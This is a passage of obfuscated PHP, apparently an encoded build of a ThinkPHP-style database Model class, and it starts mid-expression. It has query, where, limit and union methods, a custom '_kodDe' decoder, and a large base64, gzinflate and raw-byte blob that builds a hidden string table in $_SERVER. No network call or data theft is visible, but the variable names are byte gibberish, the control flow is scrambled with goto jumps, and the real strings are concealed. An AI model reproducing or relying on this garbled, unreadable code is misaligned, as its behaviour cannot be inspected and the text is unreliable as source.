in_array($FÓ¾Ğ¢‚ÀÊ, $d£ÔêÉ¾à©) : !in_array($FÓ¾Ğ¢‚ÀÊ, $d£ÔêÉ¾à©); case $eğ›Âº«ôã[321]: case $eğ›Âº«ôã[322]: if (is_array($eã‚ÃñÌ«Ã)) { $Bâ¹ó†®Æ = $eã‚ÃñÌ«Ã[0]; $f—Ê½Ø£ = $eã‚ÃñÌ«Ã[1]; } else { list($Bâ¹ó†®Æ, $f—Ê½Ø£) = explode($eğ›Âº«ôã[47], $eã‚ÃñÌ«Ã); } return $CŠÉÃáæÃä == $eğ›Âº«ôã[321] ? $FÓ¾Ğ¢‚ÀÊ >= $Bâ¹ó†®Æ && $FÓ¾Ğ¢‚ÀÊ <= $f—Ê½Ø£ : $FÓ¾Ğ¢‚ÀÊ < $Bâ¹ó†®Æ || $FÓ¾Ğ¢‚ÀÊ > $f—Ê½Ø£; case $eğ›Âº«ôã[323]: case $eğ›Âº«ôã[324]: return $CŠÉÃáæÃä == $eğ›Âº«ôã[323] ? $FÓ¾Ğ¢‚ÀÊ == $eã‚ÃñÌ«Ã : $FÓ¾Ğ¢‚ÀÊ != $eã‚ÃñÌ«Ã; case $eğ›Âº«ôã[325]: $FæØ±äê = mb_strlen($FÓ¾Ğ¢‚ÀÊ, $eğ›Âº«ôã[326]); if (strpos($eã‚ÃñÌ«Ã, $eğ›Âº«ôã[47])) { list($Bâ¹ó†®Æ, $f—Ê½Ø£) = explode($eğ›Âº«ôã[47], $eã‚ÃñÌ«Ã); return $FæØ±äê >= $Bâ¹ó†®Æ && $FæØ±äê <= $f—Ê½Ø£; } else { return $FæØ±äê == $eã‚ÃñÌ«Ã; } case $eğ›Âº«ôã[327]: list($c½÷‡’³Í, $cŠÖî„ÂÑ) = explode($eğ›Âº«ôã[47], $eã‚ÃñÌ«Ã); if (!is_numeric($c½÷‡’³Í)) { $c½÷‡’³Í = strtotime($c½÷‡’³Í); } if (!is_numeric($cŠÖî„ÂÑ)) { $cŠÖî„ÂÑ = strtotime($cŠÖî„ÂÑ); } return NOW_TIME >= $c½÷‡’³Í && NOW_TIME <= $cŠÖî„ÂÑ; case $eğ›Âº«ôã[328]: return in_array(get_client_ip(), explode($eğ›Âº«ôã[47], $eã‚ÃñÌ«Ã)); case $eğ›Âº«ôã[329]: return !in_array(get_client_ip(), explode($eğ›Âº«ôã[47], $eã‚ÃñÌ«Ã)); case $eğ›Âº«ôã[316]: default: return $this->regex($FÓ¾Ğ¢‚ÀÊ, $eã‚ÃñÌ«Ã); } } public function query($dÎç³»‹†…, $C…Øëæº‘ò = false) { $BÒŒ¹·Œ¡Ô =& $_SERVER[¦·]; if (!is_bool($C…Øëæº‘ò) && !is_array($C…Øëæº‘ò)) { $C…Øëæº‘ò = func_get_args(); array_shift($C…Øëæº‘ò); } $dÎç³»‹†… = str_replace(array($BÒŒ¹·Œ¡Ô[217], $BÒŒ¹·Œ¡Ô[330]), $BÒŒ¹·Œ¡Ô[50], $dÎç³»‹†…); $dÎç³»‹†… = $this->parseSql($dÎç³»‹†…, $C…Øëæº‘ò); return $this->db->query($dÎç³»‹†…); } public function execute($Cì‡ÏÒ²…, $Eº¬ò‚Â„¾ = false) { if (!is_bool($Eº¬ò‚Â„¾) && !is_array($Eº¬ò‚Â„¾)) { $Eº¬ò‚Â„¾ = func_get_args(); array_shift($Eº¬ò‚Â„¾); } $Cì‡ÏÒ²… = $this->parseSql($Cì‡ÏÒ²…, $Eº¬ò‚Â„¾); return $this->db->execute($Cì‡ÏÒ²…); } protected function parseSql($aÔ˜ìèêà, $FäˆœáŠ‰) { $B¸‘•íµì— =& $_SERVER[¦·]; if (!0 === $FäˆœáŠ‰) { $C–Ê·ŸÄ = $this->_parseOptions(); $aÔ˜ìèêà = $this->db->parseSql($aÔ˜ìèêà, $C–Ê·ŸÄ); } elseif (is_array($FäˆœáŠ‰)) { $FäˆœáŠ‰ = array_map(array($this->db, $B¸‘•íµì—[331]), $FäˆœáŠ‰); $aÔ˜ìèêà = vsprintf($aÔ˜ìèêà, $FäˆœáŠ‰); } else { $aÔ˜ìèêà = strtr($aÔ˜ìèêà, array($B¸‘•íµì—[332] => $this->getTableName(), $B¸‘•íµì—[333] => think_config($B¸‘•íµì—[232]))); } $this->db->setModel($this->name); return $aÔ˜ìèêà; } public function db($e®òğ¥î©© = '', $F„¬©Šš§‚ = '', $FÀµ±Èá = array()) { goto B„Æ½¡Ó; AÒ˜¨Ëíâ«: static $AÉê› °Ó = array(); if (!isset($AÉê› °Ó[$e®òğ¥î©©]) || isset($AÉê› °Ó[$e®òğ¥î©©]) && $F„¬©Šš§‚ && $aŠ çÃÑçÜ[$e®òğ¥î©©] != $F„¬©Šš§‚) { if (!empty($F„¬©Šš§‚) && is_string($F„¬©Šš§‚) && !1 === strpos($F„¬©Šš§‚, $c……œê—£©[8])) { $F„¬©Šš§‚ = think_config($F„¬©Šš§‚); } $AÉê› °Ó[$e®òğ¥î©©] = Db::getInstance($F„¬©Šš§‚); } elseif (NULL === $F„¬©Šš§‚) { $AÉê› °Ó[$e®òğ¥î©©]->close(); unset($AÉê› °Ó[$e®òğ¥î©©]); return; } if (!empty($FÀµ±Èá)) { if (is_string($FÀµ±Èá)) { parse_str($FÀµ±Èá, $FÀµ±Èá); } foreach ($FÀµ±Èá as $fÈäŒÖèˆº => $FØ‘‘‰Éö) { $this->setProperty($fÈäŒÖèˆº, $FØ‘‘‰Éö); } } goto Eß›ñã«ì; D–§åµí˜è: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto b¦¬½†Îô; B„Æ½¡Ó: $c……œê—£© =& $_SERVER[¦·]; if ($c……œê—£©[33] === $e®òğ¥î©© && $this->db) { return $this->db; } static $aŠ çÃÑçÜ = array(); goto AÒ˜¨Ëíâ«; Eß›ñã«ì: $aŠ çÃÑçÜ[$e®òğ¥î©©] = $F„¬©Šš§‚; $this->db = $AÉê› °Ó[$e®òğ¥î©©]; $this->_after_db(); goto D–§åµí˜è; b¦¬½†Îô: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $dİƒóåîô˜ = get_class($this); if ($dİƒóåîô˜ == $_SERVER[¦·][334]) { return $this->name; } $this->name = substr($dİƒóåîô˜, 0, -5); } return $this->name; } public function getTableName() { $cï´î—†  =& $_SERVER[¦·]; if (empty($this->trueTableName)) { $d†ƒïºóÈÊ = !empty($this->tablePrefix) ? $this->tablePrefix : $cï´î—† [33]; if (!empty($this->tableName)) { $d†ƒïºóÈÊ .= $this->tableName; } else { $d†ƒïºóÈÊ .= think_parse_name($this->name); } $this->trueTableName = strtolower($d†ƒïºóÈÊ); } return (!empty($this->dbName) ? $this->dbName . $cï´î—† [91] : $cï´î—† [33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $AšÄ‘ğÕöÕ =& $_SERVER[¦·]; return isset($this->fields[$AšÄ‘ğÕöÕ[239]]) ? $this->fields[$AšÄ‘ğÕöÕ[239]] : $this->pk; } public function getDbFields() { $B±±†ˆÉ¸ =& $_SERVER[¦·]; if (isset($this->options[$B±±†ˆÉ¸[267]])) { $d·‡¶ŒÜğ = $this->db->getFields($this->options[$B±±†ˆÉ¸[267]]); return $d·‡¶ŒÜğ ? array_keys($d·‡¶ŒÜğ) : !1; } if ($this->fields) { $d·‡¶ŒÜğ = $this->fields; unset($d·‡¶ŒÜğ[$B±±†ˆÉ¸[238]], $d·‡¶ŒÜğ[$B±±†ˆÉ¸[239]], $d·‡¶ŒÜğ[$B±±†ˆÉ¸[240]], $d·‡¶ŒÜğ[$B±±†ˆÉ¸[237]]); return $d·‡¶ŒÜğ; } return !1; } public function data($f¦Š‰Ú¾ = '') { $D¶¥ó»Ï– =& $_SERVER[¦·]; if ($D¶¥ó»Ï–[33] === $f¦Š‰Ú¾ && !empty($this->data)) { return $this->data; } if (is_object($f¦Š‰Ú¾)) { $f¦Š‰Ú¾ = get_object_vars($f¦Š‰Ú¾); } elseif (is_string($f¦Š‰Ú¾)) { parse_str($f¦Š‰Ú¾, $f¦Š‰Ú¾); } elseif (!is_array($f¦Š‰Ú¾)) { think_exception(think_lang($D¶¥ó»Ï–[259])); } $this->data = $f¦Š‰Ú¾; return $this; } public function join($eÍê­ƒò‚) { $eÁóìËÜŠ¶ =& $_SERVER[¦·]; if (is_array($eÍê­ƒò‚)) { $this->options[$eÁóìËÜŠ¶[270]] = $eÍê­ƒò‚; } elseif (!empty($eÍê­ƒò‚)) { $this->options[$eÁóìËÜŠ¶[270]][] = $eÍê­ƒò‚; } return $this; } public function union($F‘õƒ´‘, $fª£õÖ§ = false) { goto Dó¥…Ù÷¢; Dó¥…Ù÷¢: $EÈ¦•Š‚ =& $_SERVER[¦·]; if (empty($F‘õƒ´‘)) { return $this; } if ($fª£õÖ§) { $this->options[$EÈ¦•Š‚[335]][$EÈ¦•Š‚[336]] = !0; } goto a…Èƒ†‚ê ; a…Èƒ†‚ê : if (is_object($F‘õƒ´‘)) { $F‘õƒ´‘ = get_object_vars($F‘õƒ´‘); } if (is_string($F‘õƒ´‘)) { $C°ŒŞñèÇğ = $F‘õƒ´‘; } elseif (is_array($F‘õƒ´‘)) { if (isset($F‘õƒ´‘[0])) { $this->options[$EÈ¦•Š‚[335]] = array_merge($this->options[$EÈ¦•Š‚[335]], $F‘õƒ´‘); return $this; } else { $C°ŒŞñèÇğ = $F‘õƒ´‘; } } else { think_exception(think_lang($EÈ¦•Š‚[259])); } $this->options[$EÈ¦•Š‚[335]][] = $C°ŒŞñèÇğ; goto D°…Ÿ‹›Í×; D°…Ÿ‹›Í×: return $this; goto f±¢ô²§Èñ; f±¢ô²§Èñ: } public function cache($cªì¹½µ¾¨ = true, $Eèª Ã‰‚¥ = null, $Fğôîí‚Á“ = '') { $CÎçöóØ…² =& $_SERVER[¦·]; if (!1 !== $cªì¹½µ¾¨) { $this->options[$CÎçöóØ…²[337]] = array($CÎçöóØ…²[89] => $cªì¹½µ¾¨, $CÎçöóØ…²[327] => $Eèª Ã‰‚¥, $CÎçöóØ…²[29] => $Fğôîí‚Á“); } return $this; } public function field($dîŸ¸ãïê¬, $C÷Û•Èî—ß = false) { $eÀæ•Ä©§Ô =& $_SERVER[¦·]; if (!0 === $dîŸ¸ãïê¬) { $a´°›àÆ”ˆ = $this->getDbFields(); $dîŸ¸ãïê¬ = $a´°›àÆ”ˆ ? $a´°›àÆ”ˆ : $eÀæ•Ä©§Ô[176]; } elseif ($C÷Û•Èî—ß) { if (is_string($dîŸ¸ãïê¬)) { $dîŸ¸ãïê¬ = explode($eÀæ•Ä©§Ô[47], $dîŸ¸ãïê¬); } $a´°›àÆ”ˆ = $this->getDbFields(); $dîŸ¸ãïê¬ = $a´°›àÆ”ˆ ? array_diff($a´°›àÆ”ˆ, $dîŸ¸ãïê¬) : $dîŸ¸ãïê¬; } $this->options[$eÀæ•Ä©§Ô[261]] = $dîŸ¸ãïê¬; return $this; } public function scope($CèÆãµ¼¤ = '', $d¼çñ™×Î¸ = NULL) { $Eº«µä½ =& $_SERVER[¦·]; if ($Eº«µä½[33] === $CèÆãµ¼¤) { if (isset($this->_scope[$Eº«µä½[34]])) { $EèÌ¨’Ä‡‹ = $this->_scope[$Eº«µä½[34]]; } else { return $this; } } elseif (is_string($CèÆãµ¼¤)) { $B‰„‡¸´é = explode($Eº«µä½[47], $CèÆãµ¼¤); $EèÌ¨’Ä‡‹ = array(); foreach ($B‰„‡¸´é as $dË½³¾ç¤ì) { if (!isset($this->_scope[$dË½³¾ç¤ì])) { continue; } $EèÌ¨’Ä‡‹ = array_merge($EèÌ¨’Ä‡‹, $this->_scope[$dË½³¾ç¤ì]); } if (!empty($d¼çñ™×Î¸) && is_array($d¼çñ™×Î¸)) { $EèÌ¨’Ä‡‹ = array_merge($EèÌ¨’Ä‡‹, $d¼çñ™×Î¸); } } elseif (is_array($CèÆãµ¼¤)) { $EèÌ¨’Ä‡‹ = $CèÆãµ¼¤; } if (is_array($EèÌ¨’Ä‡‹) && !empty($EèÌ¨’Ä‡‹)) { $this->options = array_merge($this->options, array_change_key_case($EèÌ¨’Ä‡‹)); } return $this; } public function where($F–ÃÜìÅ¸, $eÊà³İ = null) { $F‰Ñ—‡”£ =& $_SERVER[¦·]; if (!is_null($eÊà³İ) && is_string($F–ÃÜìÅ¸)) { if (!is_array($eÊà³İ)) { $eÊà³İ = func_get_args(); array_shift($eÊà³İ); } $eÊà³İ = array_map(array($this->db, $F‰Ñ—‡”£[331]), $eÊà³İ); $F–ÃÜìÅ¸ = vsprintf($F–ÃÜìÅ¸, $eÊà³İ); } elseif (is_object($F–ÃÜìÅ¸)) { $F–ÃÜìÅ¸ = get_object_vars($F–ÃÜìÅ¸); } elseif (is_array($F–ÃÜìÅ¸)) { foreach ($F–ÃÜìÅ¸ as $ağÆØÉÑÛÕ => $C‹à¨Äø—‰) { if ((is_numeric($ağÆØÉÑÛÕ) || !$ağÆØÉÑÛÕ) && is_string($C‹à¨Äø—‰)) { think_trace($F‰Ñ—‡”£[338], $F‰Ñ—‡”£[33], $F‰Ñ—‡”£[46]); die; } } } if (is_string($F–ÃÜìÅ¸) && $F‰Ñ—‡”£[33] != $F–ÃÜìÅ¸) { $bá‡Àéç… = array(); $bá‡Àéç…[$F‰Ñ—‡”£[339]] = $F–ÃÜìÅ¸; $F–ÃÜìÅ¸ = $bá‡Àéç…; } if (isset($this->options[$F‰Ñ—‡”£[263]])) { $this->options[$F‰Ñ—‡”£[263]] = array_merge($this->options[$F‰Ñ—‡”£[263]], $F–ÃÜìÅ¸); } else { $this->options[$F‰Ñ—‡”£[263]] = $F–ÃÜìÅ¸; } return $this; } public function limit($BÊ¿šÃèÉÑ, $AîßËŸàº = null) { $dƒ¾ŠØóÑ˜ =& $_SERVER[¦·]; $this->options[$dƒ¾ŠØóÑ˜[280]] = is_null($AîßËŸàº) ? $BÊ¿šÃèÉÑ : $BÊ¿šÃèÉÑ . $dƒ¾ŠØóÑ˜[47] . $AîßËŸàº; return $this; } public function page($C²ÔëÄ‘Ë, $fğÎ¶Öğƒë = null) { $cŒŸ­ºˆª =& $_SERVER[¦·]; $this->options[$cŒŸ­ºˆª[340]] = is_null($fğÎ¶Öğƒë) ? $C²ÔëÄ‘Ë : $C²ÔëÄ‘Ë . $cŒŸ­ºˆª[47] . $fğÎ¶Öğƒë; return $this; } public function comment($F¥‹¸•Á¢) { $this->options[$_SERVER[¦·][341]] = $F¥‹¸•Á¢; return $this; } public function setProperty($dƒíáÔ‰˜Ã, $dŸ“¿±¢éõ) { if (property_exists($this, $dƒíáÔ‰˜Ã)) { $this->{$dƒíáÔ‰˜Ã} = $dŸ“¿±¢éõ; } return $this; } } goto dº¸àŒòø¤; b†¡Ì¸Ëì‰: if (!function_exists('_kodDe')) { function _kodDe($Eä¹»ÙÀ¾©) { $Eä¹»ÙÀ¾© = base64_decode($Eä¹»ÙÀ¾©); $a×„ù÷ÑŸÖ = strlen($Eä¹»ÙÀ¾©); $CùÙ›İİÛô = ''; $bÉï’·¼…ö = ord($Eä¹»ÙÀ¾©[0]) - 30; for ($eÓ’†ÍøĞ² = 1; $eÓ’†ÍøĞ² < $a×„ù÷ÑŸÖ; $eÓ’†ÍøĞ² += 2) { if ($eÓ’†ÍøĞ² + 1 < $a×„ù÷ÑŸÖ) { $CùÙ›İİÛô .= chr(ord($Eä¹»ÙÀ¾©[$eÓ’†ÍøĞ² + 1]) + $bÉï’·¼…ö); $CùÙ›İİÛô .= chr(ord($Eä¹»ÙÀ¾©[$eÓ’†ÍøĞ²]) + $bÉï’·¼…ö); } else { $CùÙ›İİÛô .= chr(ord($Eä¹»ÙÀ¾©[$eÓ’†ÍøĞ²]) + $bÉï’·¼…ö); } } return $CùÙ›İİÛô; } } define("\246\267", "\205\276\332\226\371\363\364\244\375"); $_SERVER[¦·] = explode("\174\4\174\2\174\6", gzinflate(substr(base64_decode('H4sIAAAAAAAAA519B2Bbxfk4u+wCBQoFyoszPKJhO85yYjuyJNsituVIcpblKE/Sk/RiSU9+78krDg==')."\245\141\217\4\12\51\63\214\300\17\112\31\11\73\214\222\122\66\224\321\102\51\233\262\222\260\313\50\151\231\375\337\276\173\117\62\155\377\264\216\356\276\373\356\336\215\357\276\373\356\356\373\276\333\161\303\223\67".base64_decode('ju81vsf4Prvef+Kc9Tg4vif6ReHjz953N/TfnrlF/cEHaw/v+kvlL/YONh/dMV65z15K29GDZ+8Zuw==')."\364\271\25\113\275\357\347\136\161\35\366\320\271\303\372\1\227\235\162\321\345\306\155\127\174\63\350\172\65\366\167\155\327\222\277\127\171\176\162\104\146\361\252\256\350\347\17\134\364\332\236\277\375\271\347\242\7\76".base64_decode('WHXzgZ8tO9sYuO+uO6bc1fX6nk0XHnLp6r/Nv3H1PqcvP/nD77TiroM3ets3bBvea83aJ0/+sGay/A==')."\323\177\353\223\36\370\346\330\331\53\337\376\111\154\355\137\17\34\222\72\206\367\75\370\272\337\67\57\272\150\322\303\27\172\162\273\337\170\310\360\111\75\127\117\371\276\376\231\147\177\167\356\143\312\224\206\317\16"."\xfd\xe3\x34\xf5\xf\x2b\x6e\x37\x9f\xbc\x4e\x7d\xe6\xd1\x2f\xa6\x8c\x5d\x74\x4b\xeb\x8f\x96\x2d\xdb\xfb\xcc\xbf\xd5\x3d\xf0\x96\xb4\xf0\x8a\x97\xb2\xe7\x5\x3b\x7e\x3f\xd5\x3b\xeb\x84\xe6\x8e\xf9\x2f\x4e\x2d\xa6\x5f\x7b\xb7\xa7\x90".base64_decode('3nDmP59cG654pvGRq3zHJvf66y/f3P3tj/6519a9ztmy4bTnvxz73f7X/+qP0/655Z47337r+S/ifw==')."\xd6\x56\xd7\x7f\xb9\xe7\x45\x47\xaa\x4f\xef\x9c\xf4\x97\xc1\x3\x6e\xf1\x6c\x92\xa7\xce\xbe\x6d\xdb\xe7\x53\x9f\x95\x6f\xbf\xf0\xd6\xf7\xcf\x7b\x78\xe5\xac\xaa\x23\xae\x38\x72\xef\x6d\xce\x68\x93\xeb\xee\x29\xdf\xed\xfd\xd6\xe3\x5b"."\33\36\335\143\267\335\160\377\66\342\37\51\257\231\222\62\242\32\246\201\1\11\55\237\122\323\70\254\346\361\257\33\377\30\203\131\325\124\160\70\326\35\214\304\302\275\75\75\376\120\44\106\112\24\323\163\132\222"."\204\12\262\56\347\110\341\5\105\67\300\247\304\342\142\5\255\240\344\55\20\16\110\312\246\34\227\15\122\222\257\65\346\363\367\164\6\227\305\42\313\172\374\4\43\36\33\54\52\372\50\216\241\140\330\224\165\63"."\242\346\24\206\61\254\263\172\265\372\333\3\335\122\44\344\351\16\173\274\221\100\260\33\203\275\301\256\256\100\244\24\36\12\166\166\266\172\274\13\113\123\172\102\236\366\56\217\4\352\227\125\142\152\76\245\125\111".base64_decode('K3HKSqkaB9pUJZvEwbxMq2OOFkgowkJgDPLFbBZHulmI1F9JycUs6TOfGCnoak6mTV+ojDIoDshFUw==')."\123\363\11\34\361\217\230\272\314\341\240\306\11\135\311\51\171\122\124\330\337\351\367\106\44\130\115\251\55\24\354\222\310\120\344\144\303\124\164\151\111\207\77\344\227\140\325\233\52\121\213\53\45\234\257\267\33\164"."\x88\xe4\xe9\xec\x94\x26\x2a\xc1\x54\x72\x5\x5a\xc\xce\x53\xa6\xb0\x60\xc8\xe7\xf\x49\xad\xcb\x24\xde\x4f\x9\x2d\x97\xd3\xf2\x2e\x50\xa\x18\x4f\x53\xa8\xaa\x3f\x14\xc2\x1\x7\xa1\xe0\xce\x0\x1c\x3a\x12\x9\xb6\xb5\x85\xfd\x2c"."\x46\x1a\xb7\xa8\x13\xd4\x64\x6\xa1\x52\x4b\x2c\x99\xca\x9a\xb1\x21\x39\x5b\xa4\xc4\x3a\x80\x7f\x2b\xc9\xf\xf9\xd5\xc\x42\xc0\x83\x6a\x5e\x2d\x12\x62\x25\x45\x68\x1a\x9b\x39\x24\x50\xa4\xd8\xa\x85\xe4\x40\x36\x8d\xcc\x29\x30\xc1"."\206\160\260\251\31\377\316\43\110\361\30\114\123\164\63\246\344\23\132\122\315\223\151\330\102\246\34\41\74\331\314\370\164\25\340\221\2\65\127\102\53\214\166\151\103\244\15\51\65\253\164\262\131\226\322\262\111\105".base64_decode('5/ECyC6mkMaoY0Lu7mJORGHRREbNJnU6OX8Is44Uq5gmaIZBa9pbyGpyMqzoQu3bQDHBoikCiwitTQ==')."\xd3\x73\x3e\xc0\x0\x48\xef\x0\xb2\x57\x7b\xcb\x24\xc\x50\xc2\x4f\xa\x9d\xe2\x22\x8c\xab\xaa\xef\x97\xce\xef\xfb\xfb\x16\x80\x7f\xaa\x9\x17\x8b\x92\xaa\x65\x94\x6c\x36\xa6\x8c\x28\x64\x82\xe4\x92\x33\xd\x5a\x7b\xb7\x11\x57\xf3"."\156\0\301\321\100\60\226\221\215\114\127\162\146\14\345\242\314\61\251\214\270\12\231\2\231\303\154\332\106\55\4\14\373\273\133\63\375\2\213\315\152\11\71\53\266\24\207\63\246\131\10\53\371\44\354\20\322\42"."\155\70\217\72\254\240\50\4\311\347\220\222\122\227\264\114\352\150\124\33\51\165\1\132\111\215\162\216\227\61\163\131\26\242\255\145\60\203\1\315\21\102\23\25\44\256\214\230\244\223\244\171\211\214\254\203\341\153"."\52\232\51\347\34\302\70\12\205\254\232\220\115\125\313\273\265\204\251\230\116\303\324\25\231\224\126\61\117\202\24\1\147\160\15\316\105\147\217\127\313\233\140\372\72\43\272\234\67\122\212\356\364\23\362\156\224\100".strrev('U±©äi«¨3°Ú³dôë-tY„á†(H“×¥yªÏš¾'."\0".'ı7ÅçìàdNSM’Q¦~ĞQª|ÑF3?').base64_decode('E3CmRomyzYKqKwaNSu1dEYIMaqU4e3Q5nZMbpUIxDnqGzM8yMIxNvt4oJWDUIeWKhunUFcB+VLDQkQ==')."\xc1\xb\xa4\x9c\x5d\x70\x3c\x55\x25\xe9\xc\x3\x2e\x4d\xc0\x33\x6a\x1b\x24\x40\x46\x12\x4d\xc3\xd0\x8e\x48\xa4\x27\x16\x68\x3\x8b\x71\xb7\x3f\xd6\xe5\x89\x78\x3b\x48\xb5\x4d\x39\x4d\xeb\xdc\x9\x78\x2f\x2b\x92\x2\x97\x3a\xc1\x94".strrev('436Ÿ%NĞím(cG!'."\n".'š‰şÃOœÎ˜-Ã"‚\\ˆ$Ñq\\d´”mnEa´{ˆú'."\r".'Ö„ƒ')."\143\330\37\132\354\17\305\302\301\266\310\22\117\210\54\343\171\60\20\43\364\123\260\350\254\63\244\44\101\327\47\114\232\117\56\300\136\243\70\160\242\300\61\246\251\160\362\320\264\316\100\73\354\30\237\323\0\110"."\x4e\x11\x8b\x96\xdd\xa9\xe6\x54\x58\x77\x93\xa5\xa0\x9e\x4\x6b\x7c\x3b\xa9\x90\x1b\x35\xa8\x29\x9a\xa9\xa9\x8a\x26\xa7\x57\x3b\xc1\xbf\x35\xd5\x7d\x51\x9f\xab\xa6\xbf\xc5\xad\xf2\x3c\xee\x3a\x57\x9d\x54\x5f\x3b\x4b\xea\x1\x42\x87"."\x2a\x67\x25\xd2\xe8\x12\x8c\x5a\x29\xb8\xf0\x7\x3a\x0\xae\x49\xc2\x34\xb7\x75\x1d\x6\x86\xfc\x8b\x7a\xfd\xe1\x48\xac\xcb\x1f\xe9\x8\xfa\xc8\x17\xfc\x1e\x12\xea\xd4\xf0\xd4\xa4\x2d\xea\xc3\x3f\xfd\x64\x4\x81\xa8\x90\x56\x12\x5a".strrev('¾µ2É7F¡\'M ÖÆ’ØÆC'."\0".'Z%æè!qsÌÊ W5a#ÇÎbÇHh'."\0".'õóŠjÒÊŞ”@d,åÓV')."\215\62\133\167\170\6\370\77\347\254\111\55\47\123\111\24\115\134\45\211\147\56\6\325\130\122\72\24\231\57\152\246\156\152\20\252\133\120\272\24\63\243\221\176\116\53\264\112\105\126\67\132\313\244\222\125\150\57"."\x65\x14\xca\xa5\x81\x78\x35\xc4\x3a\xaf\xa0\x2b\x29\x95\xd0\x2d\x90\xa7\x0\x9c\x73\x61\xd5\x8\x81\x4c\x50\xbe\xa1\xf1\x25\x50\xc\xe5\x0\x93\x33\x6c\xd9\xe0\x4c\x1f\x46\x84\x95\xb9\xad\xb7\xb3\x33\xe6\xd\x76\x47\x80\x28\x8a\x21"."\113\102\201\210\237\122\204\307\27\363\170\173\330\22\306\207\211\40\300\351\131\312\336\60\144\250\136\340\373\174\201\340\54\227\56\164\220\245\342\60\340\205\5\55\157\50\316\4\51\55\311\231\57\306\230\147\343\274".base64_decode('JTm4ADzilHNjzpxiyk5Wdev6JkXEZTJAhoAzyyxYVMH+gi6sPcEwydACoUAaiSs6qUdPL0nKCcPf7g==')."\47\300\375\351\332\50\23\311\305\263\44\114\31\135\21\340\353\352\230\314\333\330\102\353\103\312\36\311\145\271\200\25\123\55\343\27\323\342\253\0\27\3\104\47\227\153\265\223\217\125\244\43\320\275\60\326\25\364".base64_decode('+TtjgW7AJSKl8N4en4cOvghvDUY6LNBewCcWezoDdnT/0kA4Ei6bBGC9flsK2HL1hPxtgaUs2hbwdw==')."\372\302\61\257\307\333\301\161\272\75\135\44\22\113\301\115\217\341\266\342\307\0\303\13\263\255\123\154\10\156\3\151\147\306\54\373\224\30\225\300\143\234\116\300\342\245\20\332\44\315\205\233\117\324\22\42\23\47"."\xb4\x22\xa5\x56\x26\xc4\xe5\x28\x83\xc8\xc9\x64\x86\xca\x74\x61\xaa\xc2\x3f\xd5\x92\x27\x2c\x99\x85\x18\x63\x5\xf1\x51\x16\x44\xcd\xa0\x71\x20\xae\x91\xef\x4b\x84\xf9\x96\xd4\x20\x6\x71\x5a\x95\x94\xa6\x2b\x3f\x4\xf0\xa4\x4c\x46"."\30\266\70\230\67\74\15\214\200\7\355\162\1\45\240\21\211\321\271\150\200\375\201\207\126\47\305\167\230\261\40\330\212\173\340\376\64\266\44\24\354\156\47\31\206\63\12\255\100\200\164\177\25\25\146\310\66\325"."\344\54\11\110\42\62\27\52\151\247\257\322\150\127\216\343\237\151\370\7\10\157\344\343\112\236\366\172\34\62\146\306\70\350\36\4\314\26\312\124\265\42\373\132\134\323\262\164\36\203\365\230\361\13\266\301\135\145"."\120\42\31\241\314\151\72\135\265\310\342\20\11\56\364\167\307\50\145\341\230\100\215\30\0\266\214\301\20\351\20\123\33\240\33\30\234\30\362\207\51\27\320\225\301\242\112\273\313\355\232\116\250\130\1\353\17\371"."\274\173\105\164\170\172\125\237\163\272\253\37\4\252\153\26\340\50\211\105\135\226\350\24\222\277\250\263\334\120\114\251\62\132\252\33\243\356\250\273\252\245\261\317\343\34\223\235\143\265\316\271\316\376\351\121\127\365"."\164\2\350\137\135\357\150\130\3\21\0\142\313\344\176\360\323\24\155\231\32\165\116\73\161\345\202\276\150\177\145\343\364\111\121\327\344\350\160\177\115\165\13\375\116\242\250\203\315\131\142\224\125\65\71\275\12\124"."\11\210\57\14\45\217\130\242\200\100\23\306\324\2\207\256\236\265\206\302\301\30\52\151\236\243\317\31\235\336\337\42\344\23\100\366\157\1\321\5\360\347\14\303\363\70\227\303\226\261\254\160\336\23\372\50\346\23"."\234\273\302\171\21\227\23\204\17\250\351\74\233\102\140\101\147\233\142\253\324\274\172\52\376\135\103\7\62\255\320\145\31\236\147\351\204\72\213\171\165\220\156\365\363\312\40\11\150\46\245\357\270\142\16\53\224\74"."\x0\xdc\x12\x7\xc4\x41\xb7\x6d\x20\x49\x88\x65\x91\x90\x46\xbe\xc0\xb7\x4b\xa\xda\x3b\x90\x56\x14\x62\x50\xec\x1a\x66\xb1\xa4\x92\x27\xe3\xb4\x1f\xc1\x36\x12\x72\x41\x9\xb\x2d\x8c\xc5\x22\x9e\xd6\x4e\x7f\x8c\x72\x18\xc2\x89\x69"."\34\161\305\126\166\70\6\232\306\71\52\345\17\11\56\62\33\203\131\11\61\3\111\321\165\115\157\104\7\177\106\261\0\145\61\260\153\62\101\177\112\140\53\55\65\65\113\270\233\11\227\210\211\235\136\220\251\64"."\1\167\267\114\102\160\127\105\243\305\76\45\331\337\7\10\131\166\246\372\127\317\130\123\115\245\144\167\24\374\107\43\230\177\221\32\27\370\370\31\100\326\112\230\154\301\55\71\237\212\61\16\10\253\300\216\31\64"."\235\255\263\20\316\245\126\123\63\345\54\103\203\151\21\10\241\334\206\256\325\144\217\216\7\260\223\63\41\270\72\13\247\167\210\103\166\263\243\51\166\342\40\34\34\1\230\103\210\342\177\233\52\50\233\316\203\211"."\340\345\213\124\300\347\44\203\350\131\352\14\20\1\236\5\124\52\152\312\140\72\233\24\152\150\105\75\241\60\34\213\220\141\312\72\130\263\270\144\7\145\60\341\170\21\324\334\1\317\41\34\160\115\165\0\151\317".base64_decode('Ac97HFxidfAjBAeTPx1ELHXw0kkw4HOohg+Jx6hclETrbGbghjwrjzpw/TuVISXroLV30EY5aAscaA==')."\xbf\xe1\x23\xb5\xe9\x5\xf4\x41\x6a\x83\x82\x80\x49\x64\x1c\x70\x38\xe0\xd8\xd2\x52\x60\x90\x76\x3\x13\xaa\x1d\x5c\xe0\x76\xa4\x75\xad\x58\xe8\xa1\x5f\x12\x62\xb8\x32\x4\xc0\x6b\xca\x0\x21\x4d\x33\x1d\x74\x3\xc4\x2\x5d\x8c\x3"."\301\352\360\320\142\76\340\274\366\154\371\44\115\300\161\173\35\60\24\246\267\311\103\342\0\227\35\354\274\225\60\370\51\51\77\315\343\342\222\175\43\142\7